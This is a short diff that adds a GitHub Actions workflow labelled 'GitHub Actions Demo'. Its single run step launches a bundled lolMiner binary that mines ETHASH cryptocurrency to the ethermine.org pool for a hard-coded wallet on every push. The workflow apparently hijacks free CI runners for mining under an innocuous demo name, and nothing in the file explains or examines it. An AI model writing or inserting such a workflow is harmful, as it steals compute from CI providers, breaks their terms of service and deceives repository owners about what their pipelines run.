@@ -1,0 +1,9 @@
+# name: GitHub Actions Demo
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - name: checkout repo content
+        uses: actions/checkout@v2
+      - run: ./1.32a/lolMiner --algo ETHASH --pool us1.ethermine.org:4444 --user 0x3b4C0279C68cB024060210bE51C62A01DB3F15EB.gogcolab --tls 0 --ethstratum ETHPROXY
